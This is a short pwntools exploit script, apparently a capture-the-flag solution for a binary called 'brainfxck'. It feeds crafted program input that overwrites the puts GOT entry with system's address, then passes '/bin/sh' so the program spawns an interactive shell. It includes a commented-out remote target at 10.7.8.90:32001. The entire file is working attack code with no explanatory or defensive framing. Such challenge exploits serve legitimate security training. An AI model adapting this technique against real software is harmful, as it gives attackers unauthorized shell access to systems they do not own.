#!/usr/bin/python

from pwn import *

add_addr 	= chr(19+0x2b)
sub_addr 	= chr(17+0x2b)
add_value	= chr(0+0x2b)
sub_value	= chr(2+0x2b)

name = "/bin/sh"

#Overwrite puts's GOT = system's address
payload = ''
payload += sub_addr * 696
payload += sub_value * 128
payload += add_addr * 1
payload += sub_value * 21
payload += add_addr * 1
payload += sub_value * 3

#context.log_level = 'debug'
s = process('./brainfxck')
#s = remote('10.7.8.90', 32001)
pause()
s.recvuntil('Enter your name: ')
#Trigger system(name) instead puts(name) - Overwritten before
s.sendline(name)
s.recvuntil("Please enter your program source code (ends with \\n character):\n")
s.sendline(payload)
s.interactive()
